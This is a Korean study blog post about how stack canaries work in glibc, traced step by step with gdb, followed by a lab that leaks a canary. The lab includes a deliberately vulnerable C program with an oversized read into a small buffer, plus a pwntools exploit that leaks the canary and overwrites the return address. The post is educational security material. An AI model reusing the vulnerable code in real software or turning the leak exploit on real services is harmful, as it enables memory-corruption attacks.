---
layout: post
title:  "System Hacking Step 6-1"
summary: Stack Canary and How to Bypass It
author: TouBVa
date: '2023-01-08 22:44:23 +09'
category: dreamhack_system_hacking
thumbnail: /assets/img/posts/sys6/Untitled%2022.jpeg
keywords: System Hacking, Stack Canary
usemathjax: true
permalink: /blog/dreamhack_system_hacking/step6-1
---


* TOC
{:toc}

<br>

# 0. 스택 카나리란?

<br>

> 스택 버퍼 오버플로우를 방어하기 위한 기법으로, 스택 버퍼와 반환 주소 사이에 임의로 생성된 값을 삽입하여 함수의 에필로그에서 해당 값의 변조를 확인하는 보호 기법
카나리 값의 변조가 확인되면 프로세스는 강제로 종료된다.
> 

<br>

<br>

# 1. 카나리의 작동 원리

<br>

## 1.1. 카나리 비활성화-활성화 비교

<br>

스택 카나리를 비활성화하는 옵션은 아래와 같다.

`-fno-stack-protector`

<br>

### 1.1.1. 카나리 비활성화의 경우

<br>

해당 옵션을 줘서 스택 카나리가 꺼진 프로그램을 실행해 스택 버퍼 오버플로우를 일으켜 보자.

![Untitled](/assets/img/posts/sys6/Untitled.jpeg)

SEGFAULT가 뜨면서 프로그램 작동이 멈춘다. 당연하다. 버퍼에게 할당된 범위를 넘어서는 길이의 입력값을 줬는데, 그 입력값이 RET addr를 오염시킬 정도의 길이였기 때문이다.

<br>

### 1.1.2. 카나리 활성화의 경우

<br>

그렇다면 해당 옵션을 주지 않고 `gcc -o` 옵션만으로 빌드해 스택 버퍼 오버플로우를 시도해 보자.

![Untitled](/assets/img/posts/sys6/Untitled%201.jpeg)

직전의 카나리가 비활성화된 경우와 비교했을 때, ‘stack smashing detected; terminated’, ‘Aborted’ 메시지가 뜨며 프로세스가 강제 종료된 것을 확인할 수 있다. 스택 카나리가 변조된 것이 탐지되어 시스템에서 강제로 프로세스를 종료한 것이다.

<br>

## 1.2.  어셈블리 비교-분석; 프롤로그와 에필로그의 차이

<br>

그렇다면 카나리를 켜고/끔에 따른 컴파일 결과는 어떻게 다를까. pwndbg를 통해 함수의 프롤로그와 에필로그를 비교해 보았다.


카나리를 켠 버전의 디스어셈블 결과:

![Untitled](/assets/img/posts/sys6/Untitled%202.jpeg)

카나리를 끈 버전의 디스어셈블 결과:

![Untitled](/assets/img/posts/sys6/Untitled%203.jpeg)

둘을 비교한 결과, **함수의 프롤로그와 에필로그에서 카나리를 켠 버전에 추가된 부분**이 눈에 띄었다.

먼저 **프롤로그**에 추가된 부분을 확인해 보자.

![Untitled](/assets/img/posts/sys6/Untitled%204.jpeg)

FS레지스터로부터 8byte 주소를 가져온다. 

<br>

### 1.2.1. FS가 대체 뭐야?

<br>

사실 나는 더 깊은 공부를 위해 이 커리큘럼을 따라가고 있는지라, 이 절의 내용은 스택 카나리를 저장하는 구조체의 역사와 그것이 참조되는 상황의 관행에 대해 다루고 있다. 또한 스택 카나리를 가져올 때의 참조는 관행적 상황이 아니라는 말 또한 덧붙이고 있다.

따라서 스택 카나리에 대해서 Overview를 하고픈 사람들에게는 이 절을 읽는 것을 추천하지 않는다.

64bit 프로세스에서는 FS:[0x28], 32bit 프로세스에서는 GS:[0x14]가 스택 카나리를 저장하고 있다.

그런데 왜? 왜 그렇게 정해졌을까? 의문이 든다. 그 이유를 서술하기 위해 TCB와 PCB에 대해 약간의 설명을 한 후, TCB의 어디에 무엇이 스택 카나리를 저장하는지에 대해 설명하는 것이 좋을 듯 하다.

<br>

먼저 **PCB가 나온 배경**을 알아보고, **PCB 안에 무엇이 왜 저장되는지**에 대해 알아보자.

어떤 프로세스가 실행될 경우, OS는 Time Sharing과 Space Sharing을 모두 적용한 상위 개념인 **프로세스 스케줄링(Process Scheduling)**을 수행하게 된다. 이는 Multiprogramming을 제공하는 OS가 가진 하드웨어 리소스의 제한 때문에 개발이 시작된 방법이면서, 이후 OS 내부에서 동일 자원에 접근하는 프로세스들이 동시에 실행될 경우 발생할 수 있는 Race Condition(Critical Section의 침해), 혹은 Deadlock(Critical Section을 여러 프로세스가 동시에 요구할 때 발생하는 교착상태)을 막기 위해 더욱 발전한 방법이다.

이때, Time Sharing의 특성으로 인해 특정 **프로그램 A를 일정 시간(Burst Time) 동안 수행하다가 중단하고, CPU를 다른 프로그램 B에게 할당해야 하는 상황**이 생긴다. 이럴 경우:


프로그램 A가 실행되던 상태를 저장하고 → 프로그램 B를 실행한 다음 → 다시 프로그램 A가 자원을 점유(Occupy)할 때 → 이전에 저장된 상태를 불러오는


일련의 기능이 보장되어야 한다. 

<br>

이와 같이 프로세스와 쓰레드의 실행 컨텍스트를 저장하기 위해 윈도우는 `EPROCESS(PCB)-KPROCESS(PEB)`와 `ETHREAD(TCB)-KTHREAD(TEB)`라는 구조체를 사용하지만, 리눅스는 `task_struct(PCB)` 와 `thread_info(TCB)` 라는 구조체를 사용한다. 상호간에 기능 자체는 유사하지만, 윈도우의 리눅스 시스템의 구조가 너무나도 다르기 때문에 상호 대체재로 보지는 않는다.

- PCB: Process Control Block
- PEB: Process Environment Block
- TCB: Thread Control Block
- TEB: Thread Environment Block

<br>

이제 **프로세스에서 TCB가 refer 되는 상황**에 대해 알아보자. 프로세스는 실행 효율성을 올리기 위해 자원을 공유한 채로 작업을 다중화하는데, 이렇게 다중화된 작업 하나하나를 쓰레드라고 한다. 그리고 이런 쓰레드의 실행 컨텍스트를 저장하는 것을 TCB라 부른다. 보통은 프로세스에서 TCB에 접근하면 PCB의 주소를 알아내려고 하는 경우가 많다(윈도우의 경우 TEB에 접근해 PEB 구조체의 시작 주소를 알아낸다).

그리고 **리눅스의 TCB, 윈도우의 TEB를 가리키는 것으로 애초에 예약된 레지스터가 바로 FS 레지스터**이다.(정확히는 TLS, Thread Local Storage를 참조해 TCB/TEB에 있는 정보 중 필요한 것을 알아낸다) 다만, 리눅스는 32bit 프로그램에서는 GS, 64bit에서는 FS 레지스터가 TEB를 가리킨다.


그럼 지금쯤 궁금증이 생길 것이다. 그래서, 저기 위의 스택 카나리를 가져오는 부분에서 FS[0x28]을 썼으니 TCB를 참조한 것일 텐데… 그럼 PCB에 접근하려고 한 건가?

아니다. 

이제까지 열심히 설명해 놓고 이렇게 말하려니 멋쩍다. 하지만 이제껏 설명한 건 FS 레지스터가 무조건 가리키는 대상인 TCB에 대해 설명하다 보니, TCB를 참조하는 행위가 PCB의 시작 주소를 알아내려는 목적으로 관행적으로 사용된다는 요지의 배경 설명이다.

<br>

**강조해 말하자면, 스택 카나리를 찾아오려 FS를 이용해 TCB에 접근하는 행위는 PCB의 시작 주소를 알기 위해 TCB에 접근하는 행위가 아니다.**


깃허브의 glibc 레포지토리를 확인해 보면, [TCB의 헤더 구조체](https://github.com/lattera/glibc/blob/a2f34833b1042d5d8eeb263b4cf4caaea138c4ad/nptl/sysdeps/i386/tls.h#L44)를 확인할 수 있다. 그곳에 있는 `stack_guard` 에 넣을 값을 생성하는 함수는 `_dl_setup_stack_chk_guard` 로, [내부 매커니즘을 들여다보면](https://github.com/lattera/glibc/blob/a2f34833b1042d5d8eeb263b4cf4caaea138c4ad/sysdeps/generic/dl-osinfo.h#L23) 무조건 최하위 1byte가 NULL인 8byte 랜덤값이 생성됨을 알 수 있다. 즉, glibc를 이용해 컴파일된 모든 프로그램의 스택 카나리는 최하위 1byte가 NULL일 것이다.

이렇게 생성된 스택 카나리 값은 TCB 구조체의 `stack_guard` 항목에 저장된다.  `stack_guard` 변수의 위치가 32bit에서는 TCB의 베이스 기준 0x14의 오프셋을 가지고 있고, 64bit에서는 0x28의 오프셋을 가지고 있기 때문에 리눅스 시스템에서 돌아가는 **ELF 확장자 파일의 64bit 버전에서는 FS:[0x28], 32bit 버전에서는 GS:[0x14]가 스택 카나리를 저장**하게 되는 것이다.


(리눅스에서 fs+0x28만 스택 카나리를 저장하는 게 아니다. 컴파일된 비트 버전에 따라 TLS-내부에 TCB가 있다-를 전담하는 레지스터가 달라진다. gdb를 붙여 64비트 버전과 32비트 버전을 비교하면 쉽게 확인할 수 있다)

<br>

### 1.2.2. gdb로 TCB의 스택 카나리 직접 확인하기

<br>

gdb에서는 `info reg system` 명령어를 통해 `fs_base`와 `gs_base` 등의 시스템 레지스터 내역을 출력할 수 있다. 단순히 `info reg` 를 통해 얻을 수 있는 레지스터들의 목록에는 표시되지 않는 레지스터들이 출력되니 중요한 명령어다.


![Untitled](/assets/img/posts/sys6/Untitled%205.jpeg)


현재 분석 대상 프로그램은 64비트로 컴파일되었으므로, fs 레지스터가 TCB 구조체를 refer할 것이다. 추측컨대, `fs_base`는 TCB 구조체의 시작 주소를 항상 가지고 있는 게 아닐까 싶다… `fs:[{hex}]`일 땐 `fs_base+hex` 를 참조하는 것 같고.

아무튼, TCB 구조체 시작 주소의 심볼이 fs_base인 것을 알았으니 이제 스택 카나리가 저장된 `FS:[0x28]`에 접근해 보자.


![Untitled](/assets/img/posts/sys6/Untitled%206.jpeg)


LSB가 NULL인 값이 나온다. 확실히 스택 카나리의 포맷에 맞는다.



![Untitled](/assets/img/posts/sys6/Untitled%207.jpeg)



그리고 실제로 `FS:[0x28]`에 접근해 rax에 스택 카나리를 복사해 넣는 인스트럭션이 진행된 후의 rax 값과 동일하다. 즉, 스택 카나리 값에 성공적으로 접근했다!


이제까지 프롤로그에 추가된 부분을 확인해 보았다. 다음으로 **에필로그에 추가**된 부분을 분석해 보자.

![Untitled](/assets/img/posts/sys6/Untitled%208.jpeg)



`read` 함수를 부른 이후 eax를 정리하는 과정 바로 다음에 추가된 4줄의 인스트럭션이다.

함수의 에필로그에서 저장되었던 스택 카나리를 불러와 TCB에 저장된 원본 스택 카나리와 xor 한다. 즉, 같은지 확인한다. 그 결과 같다면, 즉 xor 결과가 0이기 때문에 ZF가 1으로 세팅된다면 함수를 정상적으로 종료하도록 한다[^je]. 그러나 만일 다르다면 `_stack_chk_fail` 함수를 콜하게 된다. 

![Untitled](/assets/img/posts/sys6/Untitled%201.jpeg)


앞서 보았던 이 메시지를 출력하는 함수가 바로 `_stack_chk_fail` 함수이다.

[^je]: 보통 `je` 명령어는 ZF가 1로 세팅될 시 점프를 수행한다는 특성으로 인해(`jz` 와 동일한 동작을 한다) `cmp` 명령어와 함께 쓰인다. `cmp a, b` 일 때 a-b 연산을 수행하여 0일 때 ZF를 1로 세팅하는 로직이 있기 때문이다.

<br>

<br>

# 2. 카나리 생성 과정 분석

<br>

앞서 말한 분석 내용을 정리하자면 다음과 같다.


> 카나리 값은 프로세스가 시작될 때 TLS(Thread Local Space) 내부에 존재하는 TCB(Thread Control Block)[^TCBTLS]에 전역 변수로 저장되고, 컴파일러는 각 함수마다 프롤로그와 에필로그에서 이 값을 참조하도록 한다.
> 


그렇다면, 정확히 카나리 값이 TCB에 저장되는 과정은 무엇일까? 이번 섹션에서는 그 과정을 하나씩 따라가 볼 것이다.

[^TCBTLS]: TCB와 TLS를 동치해 사용하는 경우가 많지만 이 둘은 엄연히 구분되는 개념이다. TLS는 프로그래밍 방식의 일환으로서 쓰레드에게 로컬로 사용되는 각종 데이터를 따로 저장해 둔다는 아이디어의 구현이고, TCB는 메모리에 실제로 할당되는 블록으로서 쓰레드 자체의 정보를 저장하는 곳이다. 또한 이 [문서](https://uclibc.org/docs/tls.pdf)에 따르면, TCB는 TLS 내부에 존재한다.


카나리가 생성되어 저장되기까지의 과정을 큼직하게 나누어 보면 아래와 같다.

> 프로세스 시작 → TLS 할당 → fs의 base값 지정 → 이후 fs를 이용한 TCB 접근 → 스택 카나리 저장
> 

따라서, 먼저 fs의 base값이 어떻게 TLS와 연결되는지부터 확인해 보자.

<br>

## 2.1. fs와 TLS의 연결과정 추적

<br>

사실 TLS가 할당되고, FS 레지스터의 값을 TLS 구조체와 연결되도록 변경하는 과정에 대해서는 이 [포스트](https://chao-tic.github.io/blog/2018/12/25/tls)가 정말 잘 서술해 놨다. 해당 포스트에서 이 섹션에 필요한 내용만 조금 발췌해 서술하면 아래와 같다.

<br>

x86-64 커널에서는 FS에 저장되는 주소가 MSR(Model Specific Register; `MSR_FS_BASE`)에 의해 관리된다[^MSR]. 그리고 이러한 작용을 유저 프로세스가 커널에 요청할 수 있도록 시스템이 제공하는 system call이 바로 `arch_prctl` 이다.

<br>

[^MSR]: x86 커널에서는 FS와 GS가 GDT(Global Descriptor Table)에 의해 관리된다.

즉, `arch_prctl` 시스콜이 call 되는 시점에 프로세스를 중지하고 컨텍스트를 들여다 보면 FS 값이 어떻게 변화하는지, 지정된 `fs_base`는 무엇인지 알 수 있을 것이다.

gdb에는 특정 행위가 발생했을 때 곧바로 프로세스 흐름을 중단하는 `catch` 라는 명령어가 있다. 해당 명령어를 이용해 `arch_prctl` 시스콜이 발생하는 지점을 찾아보자. (이런 식으로 설정된 정지 지점은 breakpoint로 취급되기 때문에 `info b` 명령어로 리스트를 뽑아 볼 수 있다)


![Untitled](/assets/img/posts/sys6/Untitled%209.jpeg)

이제 `r` 명령어로 프로그램을 실행해 보자. 플로우가 멈췄을 때의 콜스택은 아래와 같다.


![Untitled](/assets/img/posts/sys6/Untitled%2010.jpeg)

`arch_prctl` 이 요청되고 나서 해당 요청을 수행하기 위한 과정의 초입이다. `n` 명령어로 쭉 따라가 보자. 


![Untitled](/assets/img/posts/sys6/Untitled%2011.jpeg)


`init_tls` 함수가 콜된 상황이다. 이 시점에서 해당 함수의 내부에 정의된 `__tls_init_tp` 매크로가 실행된다.


그렇다면 `__tls_init_tp` 매크로는 어떤 기능을 할까?

**`glibc.git / sysdeps / x86_64 / nptl / tls.h`** 소스 코드에 정의된 `TLS_INIT_TP` 를 보자.

```cpp
# define TLS_INIT_TP(thrdescr) \
  ({ void *_thrdescr = (thrdescr);                                              \
     tcbhead_t *_head = _thrdescr;                                              \
     int _result;                                                              \
                                                                              \
     _head->tcb = _thrdescr;                                                      \
     /* For now the thread descriptor is at the same address.  */              \
     _head->self = _thrdescr;                                                      \
                                                                              \
     /* It is a simple syscall to set the %fs value for the thread.  */              \
     asm volatile ("syscall"                                                      \
                   : "=a" (_result)                                              \
                   : "0" ((unsigned long int) __NR_arch_prctl),                      \
                     "D" ((unsigned long int) ARCH_SET_FS),                      \
                     "S" (_thrdescr)                                              \
                   : "memory", "cc", "r11", "cx");                              \
                                                                              \
    _result ? "cannot set %fs base address for thread-local storage" : 0;     \
  })
```

<br>

중간에서 `asm volatile` 로 인라인 어셈이 명시된 것이 보인다. `asm volatile`은 `__asm__ __volatile__(asms:output:input:clobber);` 형식으로 사용되며, x86과 x86-64 환경에서는 `“D”` 심볼이 `‘di’` 레지스터를 의미한다. 자세한 내용은 [여기에서](https://wiki.kldp.org/KoreanDoc/html/EmbeddedKernel-KLDP/app3.basic.html) 


즉, `TLS_INIT_TP` 가 실행되면  `ARCH_SET_FS` 가 `rdi` 에 들어가 있을 것이다. 그렇다면 `ARCH_SET_FS` 는 어떤 값을 가지고 있을까?

```cpp
//prctl.h
#ifndef _ASM_X86_PRCTL_H
#define _ASM_X86_PRCTL_H

#define ARCH_SET_GS 0x1001
#define ARCH_SET_FS 0x1002
#define ARCH_GET_FS 0x1003
#define ARCH_GET_GS 0x1004

#endif /* _ASM_X86_PRCTL_H */
```

<br>

위의 `TLS_INIT_TP` 가 명시된 소스 코드에 include된 `sys/prctl.h` 의 소스를 보니, `0x1002`인 것으로 확인되었다.

즉, `TLS_INIT_TP` 가 실행되면 `rdi` 에 `0x1002` 가 저장되고, 목표했던 `syscall`(__NR_arch_prctl; 여기에서 NR은 달라지는 아키텍처에 따라 시스콜이 추가되면서 호환성을 위해 각 아키텍처별로 다르게 호명할 수 있도록 호환성을 보장하기 위한 태그다. 자세한 건 [여기](https://man7.org/linux/man-pages/man2/syscall.2.html)에서)이 수행되며 FS에 TLS 구조체의 시작값이 할당될 것이다. 

정말로 그런지 확인해 보자.

![Untitled](/assets/img/posts/sys6/Untitled%2012.jpeg)


`TLS_INIT_TP` 가 콜되기 직전에 `rdi` 에 `0x1002` 가 들어간 게 보인다. 콜되기 전에 미리 파라미터가 레지스터에 들어간 것으로 미루어 보았을 때 아마도 컴파일러의 최적화 때문에 순서가 당겨진 것 같다.

그리고 같은 이유로 인해 이미 시스콜이 수행되며 `r12`에 `TLS` 의 시작값이 들어간 것이 확인되었다[^r12]. 실제로 `fs` 에 할당된 값이 맞는지 명령어를 통해 확인해 보자.

![Untitled](/assets/img/posts/sys6/Untitled%2013.jpeg)


맞는 것으로 확인되었다.

[^r12]: There are sixteen 64-bit registers in x86-64: %rax, %rbx, %rcx, %rdx, %rdi, %rsi, %rbp, %rsp, and %r8-r15. Of these, %rax, %rcx, %rdx, %rdi, %rsi, %rsp, and %r8-r11 are considered caller-save registers, meaning that they are not necessarily saved across function calls. Registers %rbx, %rbp, and %r12-r15 are callee-save registers, meaning that they are saved across function calls.

앞에 $가 붙은 것은 gdb상에서 심볼로 취급되므로 명령어 인라인에 사용할 수 있다. `fs_base` 가 가리키는 `TLS` 에 무엇이 저장되었는지 확인해 보자.

![Untitled](/assets/img/posts/sys6/Untitled%2014.jpeg)


그렇다면 `fs_base+0x28`, 즉 스택 카나리가 저장되는 위치에 스택 카나리가 저장되어 있는지 확인해 보자.

![Untitled](/assets/img/posts/sys6/Untitled%2015.jpeg)


아직은 아무것도 저장되어 있지 않은 것을 확인할 수 있다.

<br>

## 2.2. 스택 카나리의 저장 과정 추적

<br>

`fs_base+0x28` 위치의 값이 변경될 때가 바로 스택 카나리가 저장될 때일 것이다. 따라서 gdb의 `watch` 명령어로 해당 위치의 값이 변경될 때 코드 플로우를 멈추도록 해 보았다.

![Untitled](/assets/img/posts/sys6/Untitled%2016.jpeg)


`*` 심볼은 참조한다는 뜻이다. 즉, 해당 주소를 참조해 내부의 값을 감시한다는 뜻이 되기 때문에 특정 주소의 값 변화를 감시하기 위해서는 반드시 `*` 심볼을 사용해야 한다.

프로세스를  `c` 명령어로 이어서 수행한 결과, 아래와 같은 결과가 나왔다.

![Untitled](/assets/img/posts/sys6/Untitled%2017.jpeg)


값이 변화되자 코드 플로우가 멈추고 값이 어떻게 변화했는지가 출력된다. 정지하는 시점에서 실행되던 함수는 `security_init` 라고 명시되어 있다. 이제 실제로 `fs_base+0x28` 위치의 값이 어떻게 되었는지 확인해 보자.

![Untitled](/assets/img/posts/sys6/Untitled%2018.jpeg)

![Untitled](/assets/img/posts/sys6/Untitled%2019.jpeg)

스택 카나리 값이 저장된 것이 확인되었다.

<br>

## 2.3. main에서 사용되는 스택 카나리 확인

<br>

이제 실제로 해당 값이 main 함수에서 사용되는지 확인해 보자.

![Untitled](/assets/img/posts/sys6/Untitled%2020.jpeg)

`mov rax, qword prt fs:[0x28]` 명령어가 실행된 직후의 `rax` 를 확인해 보니, 정말로 직전에 확인했던 스택 카나리 값이 저장된 것을 볼 수 있었다.

<br>

<br>

# 3. 카나리 우회

<br>

카나리를 포함한 각종 메모리 보호 기법 우회 관련해서는 이미 [이전 포스트](https://toubva.github.io/blog/system_hacking/memory-exploit-mitigation-bypass-01/#/)에서 다룬 바가 있지만, 한 번 더 정리하려 한다.

<br>

## 3.1. Brute Force

<br>

해당 기법을 이용해 카나리를 맞춘다는 것은 불가능에 가깝다.

카나리 값으로 `x64`에서는 8byte, `x86`에서는 4byte 길이의 pseudo-random 값이 생성되며, 가장 끝 1byte가 `/x00` 인 것을 감안하더라도 각각 7byte, 4byte의 자릿수를 맞춰야 하기 때문이다.

실제 서버를 대상으로 이 기법을 수행하면 성공하기 한참 전에 경찰에 체포될 것이다.

<br>

## 3.2. TLS 접근-Canary Leak

<br>

TLS의 주소는 매번 시행할 때마다 바뀌지만, 만일 실행중에 TLS의 주소를 알 수 있고 이에 쓰기나 읽기가 가능하다면 읽어온 카나리 값을 이용하거나, 카나리 값 자체를 변조할 수 있을 것이다.

<br>

<br>

# 4. 카나리 우회 실습

<br>

## 4.1. 코드 분석

<br>

아래 코드를 컴파일한 프로그램에서 Stack Smashed 감지 없이 오버플로우를 수행해 보자.

```c
// Name: bypass_canary.c
// Compile: gcc -o bypass_canary bypass_canary.c
#include <stdio.h>
#include <unistd.h>
int main() {
  char memo[8];
  char name[8];
  printf("name : ");
  read(0, name, 64);
  printf("hello %s\n", name);
  printf("memo : ");
  read(0, memo, 64);
  printf("memo %s\n", memo);
  return 0;
}
```

<br>

가장 먼저 이름을 입력하는 란에 8글자를 입력해 보았다. 

`read` 함수가 64글자까지를 받기 때문에, 원래는 7글자까지만 사용자 입력을 받은 다음 뒤에 NULL byte가 붙을 것을 상정하고 선언된 `name` 배열은 충분히 오버플로우될 수 있다.

즉, 스택 카나리의 최하위 1byte가 `\x00`, 즉 NULL byte로 설정되는 특성과 리틀 엔디안으로 가장 작은 자릿수가 가장 먼저 인식된다는 점을 감안했을 때, Canary Leak을 원하는 사용자는 총 9byte의 입력을 주어 스택 카나리의 최하위에 존재하는 NULL byte를 없애야만 한다. 

이를 그림으로 본다면 아래와 같다.

![Untitled](/assets/img/posts/sys6/Untitled%2021.jpeg)


위와 같았던 메모리를

![Untitled](/assets/img/posts/sys6/Untitled%2022.jpeg)


`name` 변수에 9byte를 넣음으로써 스택 카나리의 최하위 비트인 `\x00` 이 지워지게 만들었다.

이후 name 변수를 출력하기 위해  `printf` 함수를 사용하는데, 해당 함수는 null byte를 문자열의 끝으로 보고 메모리 읽기를 멈추는 특성이 있기 때문에 스택 카나리까지를 고스란히 출력하게 된다.

<br>

## 4.2. 익스플로잇 구성

<br>

이제 익스플로잇을 짜 보자.

익스플로잇에 구현되어야 할 기능은 다음과 같다.

1. 총 9 byte의 입력값을 준다. `sendline()` 함수를 사용한다면 끝에 개행 문자가 자동으로 붙는 것을 감안하여 해당 함수의 인자로 8 byte를 주는 식이다.
2. 이후 출력되는 값을 받아오고, 그중 하위 7byte만 저장한다. (문자열 출력 방식에 따라 리틀 엔디안 방식으로 표현된 스택 카나리가 나올 것이다)
3. 저장한 값의 최상위 1byte에 `\x00` 을 저장한다.
4. 이후 memo 변수에 대한 입력으로 `\x10` byte의 dump와 스택 카나리 값(리틀 엔디안), 8 byte의 dump, 그리고 RET로 주고 싶은 값을 준다.
    - ASLR이 켜져 있고 NX-bit가 활성화되어 있으며 Full-RELRO이기 때문에 이 경우 가능한 익스 방법은 GOT의 base 주소를 leak해서 system 함수의 PLT를 알아낸 다음 RET에 넣어주는 것이다. PLT의 주소를 덮어쓰는 게 불가능하니까…
    - 근데 그걸… 지금은 못할 듯? 일단 입력값을 최장 64 byte 만 받고 있기 때문에 현재 libc의 base가 leak되지 않았고 system 함수가 사용되지 않아 plt 심볼을 찾을 수 없는 점을 감안하면 더 돌아 돌아 가야 할 텐데, 그걸 64 byte 이내로 구현 못 하겠다.
    - 어떻게 할 지 방법이 안 서는 것도 있고!


따라서 익스플로잇의 목적은 리턴 주소를 원하는 값으로 변조하더라도 스택 카나리 변조가 인식되지 않게끔 하는 것으로 결정되었다.

<br>

## 4.3. 익스플로잇 실행

<br>

내가 작성한 익스플로잇은 아래와 같았다.

```python
from pwn import *

p = process("./bypass_canary")

# 1. 9 byte input
p.sendline('AAAAAAAA')

# 2. get 7 bytes(least significant) from output and insert Null byte in front of it

p.recvuntil('hello AAAAAAAA\n')
temp=bytearray(7)
temp = p.recv(7)
zero=bytearray(1)
canary = zero+temp

# 3. give the payload which I want
dump = b'A'*0x10
canary
rbp_dump = b'A'*0x08
ret_addr = p64(0xDEADBEEFCAFECAFE)

payload = dump+canary+rbp_dump+ret_addr

gdb.attach(p)
raw_input("1")

p.sendline(payload)

p.interactive()
```

<br>

해당 익스플로잇을 실행한 결과는 아래와 같았다.

![Untitled](/assets/img/posts/sys6/Untitled%2023.jpeg)



`main` 함수의 가장 마지막 부분에서 스택 카나리 원본과 스택에 저장된 스택 카나리 값을 비교하고 `main+183` 에서 만일 값이 같다면 정상적으로 프로세스를 종료하고 만일 아니라면 오류를 내보내도록 되어 있다. 따라서 `main+183` 에 브레이크 포인트를 걸고 continue해 보았다.



![Untitled](/assets/img/posts/sys6/Untitled%2024.jpeg)



그 결과, rbp의 바로 아래인 ret addr에 내가 의도했던 리턴값이 들어가 있고, `rbp-0x8` 에는 스택 카나리 값이 그대로 들어가 있어 분기 조건에 부합하여 정상적으로 프로그램이 종료되는 루틴을 확인할 수 있었다.

<br>

<br>

# 번외: 삽질이 남긴 지식

<br>

## 1. 와! 리눅스 대상 분석을 하는데 윈도우 프로세스 관리를 가져왔다?!?

<br>

와! 샌즈! 아시는구나!

이걸 쓰는 지금 눈물이 난다….

아무 생각 없이 PCB에 대해 검색해서 구조체에 대해 열심히 공부하고 정리했는데… 윈도우 거였네

아무튼 아래 내용은 윈도우의 프로세스 관리 구조체에 대해 서술한 내용이다.

(나뭇잎 책에도 잘 나와 있는 내용이니 해당 책이 있는 사람들은 그걸 보길 추천한다. 나는 이걸 다 쓰고 나서 나뭇잎 책에 비슷한 내용이 있다는 사실을 깨달았다)

<br>

어떤 프로세스가 실행될 경우, OS는 Time Sharing과 Space Sharing을 모두 적용한 상위 개념인 **프로세스 스케줄링(Process Scheduling)**을 수행하게 된다. 이는 Multiprogramming을 제공하는 OS가 가진 하드웨어 리소스의 제한 때문에 개발이 시작된 방법이면서, 이후 OS 내부에서 동일 자원에 접근하는 프로세스들이 동시에 실행될 경우 발생할 수 있는 Race Condition(Critical Section의 침해), 혹은 Deadlock(Critical Section을 여러 프로세스가 동시에 요구할 때 발생하는 교착상태)을 막기 위해 더욱 발전한 방법이다.

이때, Time Sharing의 특성으로 인해 특정 **프로그램 A를 일정 시간(Burst Time) 동안 수행하다가 중단하고, CPU를 다른 프로그램 B에게 할당해야 하는 상황**이 생긴다. 이럴 경우:

프로그램 A가 실행되던 상태를 저장하고 → 프로그램 B를 실행한 다음 → 다시 프로그램 A가 자원을 점유(Occupy)할 때 → 이전에 저장된 상태를 불러오는

일련의 기능이 보장되어야 한다. 이를 위해 만들어진 것을 **PCB**라고 한다. Process Control Block의 준말이다.

그리고 이 PCB의 확장판 개념을 **윈도우 OS에서 구현한 것이 바로 EPROCESS 구조체**다. 이 EPROCESS 구조체의 가장 첫 번째를 차지하는 것이 바로 KPROCESS(PCB) Block이고, **세번째에 PEB 구조체**를 가지고 있다. **PEB 안에는 이미지 정보, 프로세스 힙 정보와 같은 유저 모드에서 접근할 수 있는 정보가 저장된다.**

**PCB를 가지고 있는 EPROCESS**와 **PCB인 KPROCESS**는 모두 **커널 영역**에 위치해 있어서, 유저 모드의 프로세스가 접근할 수 없기 때문에 **유저 모드인 프로세스도 접근할 수 있도록 PEB를 따로 만들었다**고 이해하면 된다.

ETHREAD구조체와 KTHREAD구조체, 그리고 TEB의 관계도 동일하다.  

이 관계를 그림으로 그리면 아래와 같다.

![Untitled](/assets/img/posts/sys6/Untitled%2025.jpeg)

EPROCESS는 ETHREAD를 refer하지만, PEB와 TEB의 연결 관계는 없다.

<br>
---